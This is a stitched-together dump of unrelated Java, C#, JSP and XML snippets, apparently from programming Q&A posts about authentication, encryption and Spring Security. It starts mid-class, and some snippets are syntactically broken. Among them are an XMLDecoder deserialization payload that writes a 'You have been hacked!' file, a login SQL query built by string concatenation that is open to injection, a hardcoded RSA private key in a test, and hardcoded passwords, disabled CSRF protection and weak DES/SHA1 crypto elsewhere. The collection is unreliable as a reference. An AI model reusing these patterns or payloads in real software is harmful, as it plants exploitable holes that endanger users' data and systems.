    
    }
    
    class SpriteIO {
       public static Icon[] getSprites(String spriteSheetSpec, int spriteRows)
             throws MalformedURLException, IOException {
          Icon[] icons = new Icon[spriteRows * spriteRows];
          URL spriteSheetUrl = new URL(spriteSheetSpec);
          BufferedImage spriteSheet = ImageIO.read(spriteSheetUrl);
          double wD = (double) spriteSheet.getWidth() / spriteRows;
          double hD = (double) spriteSheet.getHeight() / spriteRows;
          int w = (int) wD;
          int h = (int) hD;
          for (int i = 0; i < spriteRows; i++) {
             for (int j = 0; j < spriteRows; j++) {
                int x = (int) (i * wD);
                int y = (int) (j * hD);
                BufferedImage img = spriteSheet.getSubimage(x, y, w, h);
    
                icons[j * spriteRows + i] = new ImageIcon(img);
             }
          }
          return icons;
       }
    }
    
    @SuppressWarnings("serial")
    class SpriteAnimationPanel extends JPanel {
       private static final int TIMER_DELAY = 200;
       private Icon[] icons;
       private JLabel animationLabel = new JLabel();
    
       public SpriteAnimationPanel(Icon[] icons) {
          this.icons = icons;
          setLayout(new BorderLayout());
          add(animationLabel );
       }
    
       public void startAnimation() {
          Timer spriteTimer = new Timer(TIMER_DELAY, new ActionListener() {
             private int iconIndex = 0;
             
             @Override
             public void actionPerformed(ActionEvent arg0) {
                animationLabel.setIcon(icons[iconIndex]);
                iconIndex++;
                iconIndex %= icons.length;
             }
          });
          spriteTimer.start();
       }
    }
---UNIQUEIDFORSNIP---|184996936|mvn spring-boot:run -Dspring.datasource.password=SECRET_PASSWORD
---UNIQUEIDFORSNIP---|184996940|spring.datasource.password=${myDbPasswordEnv}
---UNIQUEIDFORSNIP---|185008164|    #{if session.username }
        <!-- You can show users' profile -->
    #{/if}
    #{else}
        <!-- Show login form now. You can create a login template-tag form and call it here. -->
    #{/else}
---UNIQUEIDFORSNIP---|185539698|    permission java.net.SocketPermission "*", "resolve"; 
    permission java.net.SocketPermission "localhost:5432", "connect,resolve";
---UNIQUEIDFORSNIP---|185658755|    String password = "MyPassword123";
    String hashed = BCrypt.hashpw(password, BCrypt.gensalt(12));
    System.out.println(hashed);  // $2a$12$QBx3/kI1SAfwBDFOJK1xNOXK8R2yC7vt2yeIYusaqOisYbxTNFiMy
---UNIQUEIDFORSNIP---|185714643|    String concatenated = username + ":" + raw_password;
    String schemeSpecificTextValue = base_64_encode(concatenated.toCharArray());
---UNIQUEIDFORSNIP---|185714645|    Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
---UNIQUEIDFORSNIP---|185773134|    # Set compilation mode. JIT = at runtime; FORCE = before execution.
    # Options: [JIT, FORCE, OFF, OFFIR], Default: JIT.
    compile.mode=JIT
---UNIQUEIDFORSNIP---|186052523|    FileInputStream fin = new FileInputStream("PathToCertificate");
    CertificateFactory f = CertificateFactory.getInstance("X.509");
    X509Certificate certificate = (X509Certificate)f.generateCertificate(fin);
    PublicKey pk = certificate.getPublicKey();
  
---UNIQUEIDFORSNIP---|186401521|    File dir = new File (System.getProperty("java.home") + SEP + "lib" + SEP + "security");
    File keystoreFile = new File(dir, "cacerts"); <-- file name missing, 'cacerts' is a directory
---UNIQUEIDFORSNIP---|186587149|	public static void main(String[] args) {
		
	    CodeSource source;
		
    	try {
  	      source = new CodeSource(new URL("file:/c:/*"), (java.security.cert.Certificate[]) null);
          
  	      Policy policy = Policy.getPolicy();
  	      System.out.println(policy.getPermissions(source));
   
      	} catch (IOException e) {
  	      e.printStackTrace();
  	    }
      }
---UNIQUEIDFORSNIP---|186587155|    FilePermission perm = new FilePermission("path/file", "read");
    AccessController.checkPermission(perm);
---UNIQUEIDFORSNIP---|186608281|    /subsystem=web/virtual-server=default-host/sso=configuration:add(reauthenticate="false")
---UNIQUEIDFORSNIP---|186608290|    <sso reauthenticate="false"/>
---UNIQUEIDFORSNIP---|186608297|    <web-resource-collection>
        <web-resource-name>SecretProtection</web-resource-name>
        <url-pattern>/servlet/SalaryServer</url-pattern>
        <url-pattern>/servlet/secret</url-pattern>
        <url-pattern>/test</url-pattern>
    </web-resource-collection>
---UNIQUEIDFORSNIP---|186612652|    public class AppSecurity{
    private AppSecurity() {}
    public static byte[] encrypt(byte[] key , byte[] data) {
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        try {
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.ENCRYPT_MODE,keySpec);
            return cipher.doFinal(data);
        }
        catch (NoSuchAlgorithmException e){ }
        catch (NoSuchPaddingException e){ }
        catch (InvalidKeyException e){ }
        catch (BadPaddingException e){ }
        catch (IllegalBlockSizeException e) {}
        return null;
    }
    public static byte[] decrypt(byte[] key , byte[] encryptedData) {
        SecretKeySpec keySpec = new SecretKeySpec(key ,"AES");
        try {
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.DECRYPT_MODE, keySpec);
            return cipher.doFinal(encryptedData);
        }
        catch (NoSuchAlgorithmException e) {}
        catch (NoSuchPaddingException e) { }
        catch (InvalidKeyException e) { }
        catch (BadPaddingException e) {}
        catch (IllegalBlockSizeException e) {}
        return null;
    }
    /**
     * method to generate a secure key. call this when app starts
     * @return
     */
    public static byte[] generateKey(){
        try{
            // create an AES algorithm instance.
            KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
            SecureRandom secureRandom = SecureRandom.getInstance("SHA1PRNG");
            keyGenerator.init(128,secureRandom);
            SecretKey secretKey = keyGenerator.generateKey();
            return secretKey.getEncoded();
        }
        catch (NoSuchAlgorithmException e){
            return null;
        }
      }
    }
---UNIQUEIDFORSNIP---|186612654|     private static byte[] encryptedByte(String s) {
        return AppSecurity.encrypt(YourApplication.getSecretKey(),toBytes(s));
     }
---UNIQUEIDFORSNIP---|186612656|      private static String decryptedString(byte[] blob) {
        // here getSecretKey() should be the one used on encryption
        byte[] decrypted =  AppSecurity.decrypt(YourApplication.getSecretKey(),blob);
        return toString(decrypted);
---UNIQUEIDFORSNIP---|186612658|    public static String toString(byte[] bytes) {
      try {
        String s = new String(bytes ,"UTF-8");
         return s;
         } catch (UnsupportedEncodingException e) {
          return null;
         }
      }
---UNIQUEIDFORSNIP---|186612660|     public static byte[] toBytes(String s) {
       try {
           return s.getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {return null;}
       }
---UNIQUEIDFORSNIP---|186612662|     // initialize it on your app startup
     String mSecretKey = initSecurity()
     // call this method when you encrypt /decrypt
     public static byte[] getSecretKey() { return mSecretKey; } 
---UNIQUEIDFORSNIP---|186612664|     private void initSecurity() {
        final String secretFile = "secure_file";
        boolean keyExists = false;
        //check if secret key exist in secure file
        try {
            FileInputStream inputStream = openFileInput(secretFile);
            mSecretKey = new byte[16];
            int result = inputStream.read(mSecretKey);
            if(result >0) {
                keyExists = true;
            }
            inputStream.close();
        }
        catch (FileNotFoundException e) {}
        catch (IOException e){}
        if(!keyExists) {
            // generate a key
            mSecretKey = AppSecurity.generateKey();
            if(mSecretKey != null) {
                // write in a secure file inside the app
                try {
                    // MODE_PRIVATE will create the file (or replace a file of the same name)
                    // and make it private to the application.
                    FileOutputStream outputStream = openFileOutput(secretFile,Context.MODE_PRIVATE);
                    outputStream.write(mSecretKey);
                    outputStream.close();
                }
                catch (FileNotFoundException e){}
                catch (IOException e) {}
            }
        }
    }
---UNIQUEIDFORSNIP---|186633621|    request.getSession().invalidate();
---UNIQUEIDFORSNIP---|186791831|    JPasswordField p1=new JPasswordField("pass",6);
    p1.setEchoChar('*');
    top.add(p1);
---UNIQUEIDFORSNIP---|186802496|C:\Program Files\Java\jdk1.6.0_25\jre\lib\security
---UNIQUEIDFORSNIP---|186802498|C:\Program Files\Java\jre6\lib\security
---UNIQUEIDFORSNIP---|186816884|     public class JPasswordFieldTest {
    
        private JPanel panel;
    
        public JPasswordFieldTest() {
            panel = new JPanel();
            //set horizontal gap
            ((FlowLayout) panel.getLayout()).setHgap(2);
    
            panel.add(new JLabel("Enter pin :"));
            JPasswordField passwordField = new JPasswordField(4);
            PlainDocument document = (PlainDocument) passwordField.getDocument();
            document.setDocumentFilter(new DocumentFilter() {
    
                @Override
                public void replace(DocumentFilter.FilterBypass fb, int offset, int length, String text, AttributeSet attrs) throws BadLocationException {
                    String string = fb.getDocument().getText(0, fb.getDocument().getLength()) + text;
    
                    if (string.length() <= 4) {
                        super.replace(fb, offset, length, text, attrs); //To change body of generated methods, choose Tools | Templates.
                    }
                }
    
            });
            panel.add(passwordField);
            JButton button = new JButton("OK");
            panel.add(button);
    
        }
    
        public static void main(String[] args) {
            //Schedule a job for the event-dispatching thread:
            //creating and showing this application's GUI.
            SwingUtilities.invokeLater(new Runnable() {
                public void run() {
                    createAndShowGUI("Password Example");
                }
            });
    
        }
    
        private static void createAndShowGUI(String str) {
            JFrame frame = new JFrame(str);
            frame.setDefaultCloseOperation(EXIT_ON_CLOSE);
            JPasswordFieldTest test = new JPasswordFieldTest();
            frame.add(test.panel);
            frame.pack();
            frame.setVisible(true);
        }
    
    }
---UNIQUEIDFORSNIP---|186911997|        byte[] byteBuffer = new byte[(int) inputFile.length()];
        DataInputStream dis = new DataInputStream(inputStream);
        dis.readFully(byteBuffer);
        dis.close();
        CipherOutputStream cos = new CipherOutputStream(outputStream, cipher);
        cos.write(byteBuffer);
        cos.close();
---UNIQUEIDFORSNIP---|187031375|    create table users(
        username varchar_ignorecase(50) not null primary key,
        password varchar_ignorecase(50) not null,
        enabled boolean not null);
    
    create table authorities (
        username varchar_ignorecase(50) not null,
        authority varchar_ignorecase(50) not null,
        constraint fk_authorities_users foreign key(username) references users(username));
        create unique index ix_auth_username on authorities (username,authority);
---UNIQUEIDFORSNIP---|187070348|	protected void authenticate(UserDTO user){
		SecurityContextHolder.getContext().getAuthentication();
		UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken(user.getUsername(), user.getPassword());
		token.setDetails(new WebAuthenticationDetails(getRequest()));
		Authentication authentication = authenticationManager.authenticate(token);
		SecurityContextHolder.getContext().setAuthentication(authentication);
	}
---UNIQUEIDFORSNIP---|187197799|    String fileLoc = "/var/tmp/myImage.jpg";
    String[] cmd = {"chmod", "0444", fileLoc};
    ProcessBuilder pb = new ProcessBuilder(cmd);
    Process process = pb.start();
    int error = process.waitFor();
    if (error != 0){
        //non 0 means something bad happend
    } 
---UNIQUEIDFORSNIP---|187242041|    private static String encriptar(String xmlSolicitud, PrivateKey privateKey)
            throws Exception {
        Signature signature=Signature.getInstance("SHA1withRSA");
        signature.initSign(privateKey);
        signature.update(xmlSolicitud.getBytes(Charset.forName("UTF-8")));
        
        byte[] signatureValue = signature.sign();
        String response = Base64.encode(signatureValue);
        
        signature.initVerify(keyReader.publicKeyRead(Reference.rutaPublicKeyTest));
        signature.update(xmlSolicitud.getBytes(Charset.forName("UTF-8"))); // <-- Here
        
        System.out.println(signature.verify(signatureValue)); // <-- Will print true
        
        return response;
    }
---UNIQUEIDFORSNIP---|187343337|    pattern="\A/hero.jsp/$?chooseHero=\Z"
---UNIQUEIDFORSNIP---|187343341|    pattern="\A/hero\.jsp/\$\?chooseHero=\Z"
---UNIQUEIDFORSNIP---|187443211|    file:///path/to/application.jnlp
?
---UNIQUEIDFORSNIP---|187483800|    <RSAKeyValue>
        <Modulus>tt5QV .... kJqsMZ2yuxZfoyQ==</Modulus>
        <Exponent>AQAB</Exponent>
    </RSAKeyValue>
---UNIQUEIDFORSNIP---|187483802|    private bool TryGetValidDocument(string publicKey, XmlDocument doc)
    {
        var rsa = new RSACryptoServiceProvider();
        rsa.FromXmlString(publicKey);
    
        var nsMgr = new XmlNamespaceManager(doc.NameTable);
        nsMgr.AddNamespace("sig", "http://www.w3.org/2000/09/xmldsig#");
    
        var signedXml = new SignedXml(doc);
        var sig = (XmlElement) doc.SelectSingleNode("//sig:Signature", nsMgr);
        if (sig == null)
        {
            Console.WriteLine("Could not find the signature node");
            return false;
        }
        signedXml.LoadXml(sig);
    
        return signedXml.CheckSignature(rsa);
    }
---UNIQUEIDFORSNIP---|187483804|    private bool TryGetValidDocument(X509Certificate2 cert, XmlDocument doc)
    {
        var nsMgr = new XmlNamespaceManager(doc.NameTable);
        nsMgr.AddNamespace("sig", "http://www.w3.org/2000/09/xmldsig#");
    
        var signedXml = new SignedXml(doc);
        var sig = (XmlElement) doc.SelectSingleNode("//sig:Signature", nsMgr);
        if (sig == null)
        {
            Logger.Warn("Could not find the signature node");
            return false;
        }
        signedXml.LoadXml(sig);
    
        return signedXml.CheckSignature(cert, true);
    }
---UNIQUEIDFORSNIP---|187697712|    public enum SQLQuery {
      QUERY1("SELECT foo FROM BAR", 0),
      QUERY2("SELECT foo from BAR where baz = ?"; 1);
      private final String sql;
      private final int argumentCount;
      private SQLQuery(final String sql, final int argumentCount) {
        this.sql = sql;
        this.argumentCount = argumentCount;
      }
      public String getSQL() {
        return sql;
      }
      public int getArgumentCount() {
        return argumentCount;
      }
    }
---UNIQUEIDFORSNIP---|187697714|    public ResultSet executeQuery(SQLQuery query, Object... arguments) {
      // implementation left as an exercise for the reader
    }
---UNIQUEIDFORSNIP---|187762094|    String pem = new String(Files.readAllBytes(Paths.get("rsa.key")));
    String privateKeyPEM = pem.replace(
            "-----BEGIN RSA PRIVATE KEY-----\n", "")
                 .replace("-----END RSA PRIVATE KEY-----", "");
     byte[] encodedPrivateKey = Base64.getDecoder().decode(privateKeyPEM);
---UNIQUEIDFORSNIP---|187762096|     // We must use a PasswordBasedEncryption algorithm in order to encrypt the private key, you may use any common algorithm supported by openssl, you can check them in the openssl documentation http://www.openssl.org/docs/apps/pkcs8.html
    String MYPBEALG = "PBEWithSHA1AndDESede";
    String password = "pleaseChangeit!";
    
    int count = 20;// hash iteration count
    SecureRandom random = new SecureRandom();
    byte[] salt = new byte[8];
    random.nextBytes(salt);
    
    // Create PBE parameter set
    PBEParameterSpec pbeParamSpec = new PBEParameterSpec(salt, count);
    PBEKeySpec pbeKeySpec = new PBEKeySpec(password.toCharArray());
    SecretKeyFactory keyFac = SecretKeyFactory.getInstance(MYPBEALG);
    SecretKey pbeKey = keyFac.generateSecret(pbeKeySpec);
    
    Cipher pbeCipher = Cipher.getInstance(MYPBEALG);
    
    // Initialize PBE Cipher with key and parameters
    pbeCipher.init(Cipher.ENCRYPT_MODE, pbeKey, pbeParamSpec);
    
    // Encrypt the encoded Private Key with the PBE key
    byte[] ciphertext = pbeCipher.doFinal(encodedPrivateKey);
    
    // Now construct  PKCS #8 EncryptedPrivateKeyInfo object
    AlgorithmParameters algparms = AlgorithmParameters.getInstance(MYPBEALG);
    algparms.init(pbeParamSpec);
    EncryptedPrivateKeyInfo encinfo = new EncryptedPrivateKeyInfo(algparms, ciphertext);
    
    // and here we have it! a DER encoded PKCS#8 encrypted key!
    byte[] encryptedPkcs8 = encinfo.getEncoded();
---UNIQUEIDFORSNIP---|187762098|    public static PrivateKey getPrivateKey(byte[]   encryptedPkcs8, String passwd) throws Exception{
            EncryptedPrivateKeyInfo encryptPKInfo = new EncryptedPrivateKeyInfo(encryptedPkcs8);
            Cipher cipher = Cipher.getInstance(encryptPKInfo.getAlgName());
            PBEKeySpec pbeKeySpec = new PBEKeySpec(passwd.toCharArray());
            SecretKeyFactory secFac = SecretKeyFactory.getInstance(encryptPKInfo.getAlgName());
            Key pbeKey = secFac.generateSecret(pbeKeySpec);
            AlgorithmParameters algParams = encryptPKInfo.getAlgParameters();
            cipher.init(Cipher.DECRYPT_MODE, pbeKey, algParams);
            KeySpec pkcs8KeySpec = encryptPKInfo.getKeySpec(cipher);
            KeyFactory kf = KeyFactory.getInstance(ALGORITHM);
            return kf.generatePrivate(pkcs8KeySpec);
    }
---UNIQUEIDFORSNIP---|187832803|    <dependency>
        <groupId>org.jboss.ws</groupId>
	<artifactId>jbossws-api</artifactId>
	<version>1.0.2.Final</version>
    </dependency>
---UNIQUEIDFORSNIP---|187832806|    <dependency> 
        <groupId>javax</groupId> 
        <artifactId>javaee-web-api</artifactId> 
        <version>6.0</version> 
        <scope>provided</scope> 
    </dependency>
---UNIQUEIDFORSNIP---|188133696|    Properties props = new Properties();
    Session session = Session.getDefaultInstance(props, null);
    try {
        Message msg = new MimeMessage(session);
        msg.setFrom(new InternetAddress("admin@domain.com", "Admin", "UTF-8"));
        msg.addRecipient(Message.RecipientType.TO, new InternetAddress(recipientAddress));
        msg.setSubject(emailSubject);
        msg.setText(emailText);
        Transport.send(msg);
    } catch (AddressException e) {
	// TO address not valid
    } catch (MessagingException e) {
        // other email error
    } catch (UnsupportedEncodingException e) {
        // should not happen UTF-8 is always available
    }
---UNIQUEIDFORSNIP---|188201391|    mockMvc = MockMvcBuilders
				.webAppContextSetup(context)
				.apply(springSecurity())
				.build();
---UNIQUEIDFORSNIP---|188201393|    .authorizeRequests()
                .antMatchers("/api/user/**", "/user").authenticated()
                .antMatchers("/api/admin/**", "/templates/admin/**", "/admin/**").hasRole("ADMIN")
                .anyRequest().permitAll();
---UNIQUEIDFORSNIP---|188201395|    @WithMockUser(authorities="ADMIN")
---UNIQUEIDFORSNIP---|188450135|    addFilterChain("/secure/**", AUTHC, config(ROLES, "admin"));
---UNIQUEIDFORSNIP---|188472416|    URL fileurl = new URL(getCode() + file);
---UNIQUEIDFORSNIP---|188472420|    URL fileurl = new URL(getCode(), file);
---UNIQUEIDFORSNIP---|188958771|    @Component
    public class RestAuthenticationFailureHandler implements AuthenticationFailureHandler
    {
      @Override
      public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response,
          AuthenticationException ex) throws IOException, ServletException
      {
        response.setStatus(HttpStatus.FORBIDDEN.value());
        
        Map<String, Object> data = new HashMap<>();
        data.put("timestamp", new Date());
        data.put("status",HttpStatus.FORBIDDEN.value());
        data.put("message", "Access Denied");
        data.put("path", request.getRequestURL().toString());
        
        OutputStream out = response.getOutputStream();
    	com.fasterxml.jackson.databind.ObjectMapper mapper = new ObjectMapper();
        mapper.writeValue(out, data);
        out.flush();
      }
    }
---UNIQUEIDFORSNIP---|188958774|    @Configuration
    @EnableWebSecurity
    @ComponentScan("...")
    public class SecurityConfiguration extends WebSecurityConfigurerAdapter
    {
      @Override
      public void configure(HttpSecurity http) throws Exception
      {
        http.addFilterBefore(corsFilter(), ChannelProcessingFilter.class).logout().deleteCookies("JESSIONID")
            .logoutUrl("/api/logout").logoutSuccessHandler(logoutSuccessHandler()).and().formLogin().loginPage("/login")
            .loginProcessingUrl("/api/login").failureHandler(authenticationFailureHandler())
            .successHandler(authenticationSuccessHandler()).and().csrf().disable().exceptionHandling()
            .authenticationEntryPoint(authenticationEntryPoint()).accessDeniedHandler(accessDeniedHandler());
      }
    
      /**
       * @return Custom {@link AuthenticationFailureHandler} to send suitable response to REST clients in the event of a
       *         failed authentication attempt.
       */
      @Bean
      public AuthenticationFailureHandler authenticationFailureHandler()
      {
        return new RestAuthenticationFailureHandler();
      }
    
      /**
       * @return Custom {@link AuthenticationSuccessHandler} to send suitable response to REST clients in the event of a
       *         successful authentication attempt.
       */
      @Bean
      public AuthenticationSuccessHandler authenticationSuccessHandler()
      {
        return new RestAuthenticationSuccessHandler();
      }
    
      /**
       * @return Custom {@link AccessDeniedHandler} to send suitable response to REST clients in the event of an attempt to
       *         access resources to which the user has insufficient privileges.
       */
      @Bean
      public AccessDeniedHandler accessDeniedHandler()
      {
        return new RestAccessDeniedHandler();
      }
    }
 
 
---UNIQUEIDFORSNIP---|189020667|    <?xml version="1.0" encoding="UTF-8" ?>
    <java version="1.4.0" class="java.beans.XMLDecoder">
      <object class="java.io.PrintWriter">
        <string>/tmp/Hacked.txt</string>
        <void method="println">
          <string>You have been hacked!</string>
        </void>
        <void method="close"/>
      </object>
    </java>
---UNIQUEIDFORSNIP---|189020672|    PrintWriter deserialize() {
        PrintWriter obj = new PrintWriter("/tmp/Hacked.txt");
        obj.println("You have been hacked!");
        obj.close();
        return obj;
    }
---UNIQUEIDFORSNIP---|189179261|    byte[] base64String = Base64.decode(encodedString);
    byte[] plainBytes = new String(base64String).getBytes("UTF-8");
    byte[] cipherData = cipher.doFinal(plainBytes);
    System.out.println(cipherData);
    return cipherData.toString();
---UNIQUEIDFORSNIP---|189179263|    byte[] cipherData = Base64.decode(encodedString);
    byte[] plainBytes = cipher.doFinal(cipherData);
    return new String(plainBytes, "UTF-8");
---UNIQUEIDFORSNIP---|189389422|    KeyManagerFactory keyManagerFactory = KeyManagerFactory
                .getInstance("SunX509","SunJSSE");
    
    SSLContext context = SSLContext.getInstance("TLS","SunJSSE");
---UNIQUEIDFORSNIP---|189461599|    String desKey = "0123456789abcdef"; // value from user  
    byte[] keyBytes = DatatypeConverter.parseHexBinary(desKey);
    SecretKeyFactory factory = SecretKeyFactory.getInstance("DES");
    SecretKey key = factory.generateSecret(new DESKeySpec(keyBytes));
---UNIQUEIDFORSNIP---|189461603|    String desKey = "0123456789abcdef0123456789abcdef0123456789abcdef"; // user value (24 bytes)  
    byte[] keyBytes = DatatypeConverter.parseHexBinary(desKey);
    SecretKeyFactory factory = SecretKeyFactory.getInstance("DESede");
    SecretKey key = factory.generateSecret(new DESedeKeySpec(keyBytes));
---UNIQUEIDFORSNIP---|189461605|    String aesKey = "0123456789abcdef0123456789abcdef"; // user value (16/24/32 bytes)
    byte[] keyBytes = DatatypeConverter.parseHexBinary(aesKey);
    SecretKey key = new SecretKeySpec(keyBytes, "AES"); 
---UNIQUEIDFORSNIP---|189515276|    <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
    <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
    <!DOCTYPE html>
    <html>
    <head>
    	<title>Sample Page</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>
    <body>
    	<c:choose>
    		<c:when test="${pageContext.request.isUserInRole('admin')}">
    		    <p>Content for admin.<p>
    		</c:when>
            <c:when test=${pageContext.request.isUserInRole('someRole')}">
                <p>Some content here</p>
            <c:when>
    		<c:otherwise>
    			<p>Another Content</p>
    		</c:otherwise>
    	</c:choose>
    </body>
    </html>
---UNIQUEIDFORSNIP---|189515278|    package com.example.filter;
    
    import java.io.IOException;
    
    import javax.servlet.Filter;
    import javax.servlet.FilterChain;
    import javax.servlet.FilterConfig;
    import javax.servlet.ServletException;
    import javax.servlet.ServletRequest;
    import javax.servlet.ServletResponse;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    
    
    /**
     * Servlet Filter implementation class RoleCheckFilter.
     * Its purpose is to check logged-in user's role and
     * and accordingly allow or prevent access to the web resources.
     */
    public class RoleCheckFilter implements Filter {
    
    	/**
    	 * @see Filter#init(FilterConfig)
    	 */
    	public void init(FilterConfig filterConfig) throws ServletException {}
    	
    	/**
    	 * @see Filter#doFilter(ServletRequest, ServletResponse, FilterChain)
    	 */
    	public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
    				throws IOException, ServletException {
    		HttpServletRequest request = (HttpServletRequest) req;
    		HttpServletResponse response = (HttpServletResponse) res;
    					
    		if (request.isUserInRole("admin")) {
    			// user have the appropriate rights, allow the request
    			chain.doFilter(request, response);
    		} else {
    			// user does not have the appropriate rights, do something about it
    			request.setAttribute("error", "You don't have enough rights to access this resource");
    			response.sendRedirect(request.getContextPath() + "/login.jsp");
    			// or you could forward a user request somewhere
    		}
    	}
    
    
    	/**
    	 * @see Filter#destroy()
    	 */
    	public void destroy() {}
    
    }
---UNIQUEIDFORSNIP---|189515281|    <?xml version="1.0" encoding="UTF-8"?>
    <web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    	xmlns="http://java.sun.com/xml/ns/javaee"
    	xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
    	xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
    	version="3.0">
        ...
    	<filter>
    		<filter-name>Role Check Filter</filter-name>
    		<filter-class>com.example.filter.RoleCheckFilter</filter-class>
    	</filter>
    	<filter-mapping>
    		<filter-name>Role Check Filter</filter-name>
    		<url-pattern>/admin/*</url-pattern>
    	</filter-mapping>
        ...
    </web-app>
---UNIQUEIDFORSNIP---|189702020|	@Test
	public void testKey() throws Exception {
		String privKeyStr = "MIICXQIBAAKBgQCE3pA746UfpC8sFk8ZJp0yupyJqj5jy6cjdxUYoP7mCm7c0mqQDeCcDNBYW2eSozCioPrH/9L+CDQEPLYakoem+jFnUKDH5+pru/0PJTJJF8Xh/ZT9eJlvsYBr1/qSfICf6RTs7kzwq9IuSZBw7/tfNEF9i0A8FVox6HOopXod1QIDAQABAoGANOFrYBqK5lvu1koOswDWQZFZqcSSzh8IZyoGwGWa7S0r0EECXlDXmuPSq8e9IfRG8ALHrH+ZlrbnFOSgyVSWHfpj3aH+qknoSX5TW2rMQHih8865xuqheMQ+RTZ7+BRDqNsYkzxB/Z8mqzpoJQSYf+H7nWxdDCgAJVYZzxl3DmUCQQD32iEjnwiwUjii8slcmvCEZl+z84DWNdvJOg6Z38sI4AvrfpKc1WAcDg1rNZCKrRgokh54wpLt08cpFcrD04c3AkEAiTzDmc0bdgfg5wj6xHFZpYlBwiGm/bjOR2PS57P0GNU5PsDllRbFqIuzArITutO5lvZZImzuYz7Lf+cQ73pxUwJBAOdEwmdaneDo17A0m2+to3/nhqWDMVSwLMU3RyiNigZeCMFU+bkd4PBMrHi9IoJDwacZsRU9eZwxYEUV8H2Jg0ECQEEkOqRSm2pXKwX/WSjNtQPCNxhy6NUeV6vDUmTxIjh3XYjP/ynZeVEbnoj1BjB0N2/U11Jj6nPpZqb7gyppMEkCQQCoGdVYDipU+hMMnvxa0zOIyQc/a+HE0lESqn+2ZPafYi9Z1RldRMvUXhP8U7s+OuhRwprdw2ivvOFrnWyz9lL2";
		byte[] data = Base64.getDecoder().decode(privKeyStr);
		/* Add PKCS#8 formatting */
		ASN1EncodableVector v = new ASN1EncodableVector();
		v.add(new ASN1Integer(0));
		ASN1EncodableVector v2 = new ASN1EncodableVector();
		v2.add(new ASN1ObjectIdentifier(PKCSObjectIdentifiers.rsaEncryption.getId()));
		v2.add(DERNull.INSTANCE);
		v.add(new DERSequence(v2));
		v.add(new DEROctetString(data));
		ASN1Sequence seq = new DERSequence(v);
		byte[] privKey = seq.getEncoded("DER");
		PKCS8EncodedKeySpec spec = new  PKCS8EncodedKeySpec(privKey);
		KeyFactory fact = KeyFactory.getInstance("RSA");
		PrivateKey key = fact.generatePrivate(spec);
		Assert.assertNotNull("Failed to generate the private key", key);
	}
---UNIQUEIDFORSNIP---|189859180|    public void login() {
        FacesContext context = FacesContext.getCurrentInstance();
        HttpServletRequest request = (HttpServletRequest) context.getExternalContext().getRequest();
        try {
            Principal userPrincipal = request.getUserPrincipal();
            if (request.getUserPrincipal() != null) {
                request.logout();
            }
            request.login(username, password);
            userPrincipal = request.getUserPrincipal();
            authUser = userDao.findByLogin(userPrincipal.getName());
        }
        catch (ServletException ex) {
            java.util.logging.Logger.getLogger(UserLogin.class.getName()).log(Level.SEVERE, null, ex);
        }
---UNIQUEIDFORSNIP---|190064079|      String command = "C:\\setup.exe";
      Runtime.getRuntime().exec("cmd /c "+command);
---UNIQUEIDFORSNIP---|190236655|HtmlUtils.htmlEscape(x)
---UNIQUEIDFORSNIP---|190336062|    <form method="https://www.example.com/requestHandler">
    
    <input type="action" value="navigateToLoginForm" />
    <input type="token" value="qwerty1234" />
    
    </form>
---UNIQUEIDFORSNIP---|190449116|    String sql = "Select * from tblUsers where Username = '" + usern + " and password = '" + pwd + "'";
---UNIQUEIDFORSNIP---|190449118|    String securesql = "Select * from tblUsers where Username = ? and Password = ?";
    PreparedStatement prepstat = conn.prepareStatement(securesql);
    prepstat.setString(1, usern);
    prepstat.setString(2, pwd);
---UNIQUEIDFORSNIP---|190596532|    import javafx.application.Application;
    import javafx.fxml.FXMLLoader;
    import javafx.scene.Parent;
    import javafx.scene.Scene;
    import javafx.stage.Stage;
    
    /**
     *
     * @author Sam
     */
    public class WebViewTestJDK8 extends Application {
        
        @Override
        public void start(Stage stage) throws Exception {
            Parent root = FXMLLoader.load(getClass().getResource("FXMLDocument.fxml"));
            
            Scene scene = new Scene(root);
            
            stage.setScene(scene);
            stage.show();
        }
    
        /**
         * @param args the command line arguments
         */
        public static void main(String[] args) {
            launch(args);
        }
        
    }
---UNIQUEIDFORSNIP---|190596541|    import java.net.URL;
    import java.util.ResourceBundle;
    import javafx.application.Platform;
    import javafx.event.ActionEvent;
    import javafx.fxml.FXML;
    import javafx.fxml.Initializable;
    import javafx.scene.control.Label;
    import javafx.scene.web.WebEngine;
    import javafx.scene.web.WebView;
    
    public class FXMLDocumentController implements Initializable {
    
        @FXML
        private WebView webView;
    
        @Override
        public void initialize(URL url, ResourceBundle rb) {
    
            Platform.runLater(new Runnable() {
                @Override
                public void run() {
                    String html = "<html>\n"
                            + "<head>\n"
                            + "<title>jQuery Hello World</title>\n"
                            + " \n"
                            + "<script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-1.2.6.min.js\"></script>\n"
                            + " \n"
                            + "</head>\n"
                            + " \n"
                            + "<body>\n"
                            + " \n"
                            + "<script type=\"text/javascript\">\n"
                            + " \n"
                            + "$(document).ready(function(){\n"
                            + " $(\"#msgid\").html(\"Hello World by JQuery\");\n"
                            + "});\n"
                            + " \n"
                            + "</script>\n"
                            + " \n"
                            + "Hello World by HTML\n"
                            + " \n"
                            + "<div id=\"msgid\">\n"
                            + "</div>\n"
                            + " \n"
                            + "</body>\n"
                            + "</html>";
                    
                    webView.getEngine().loadContent(html);
                }
            });
    
        }
    
    }
---UNIQUEIDFORSNIP---|190596547|    <?xml version="1.0" encoding="UTF-8"?>
    
    <?import java.lang.*?>
    <?import java.util.*?>
    <?import javafx.scene.*?>
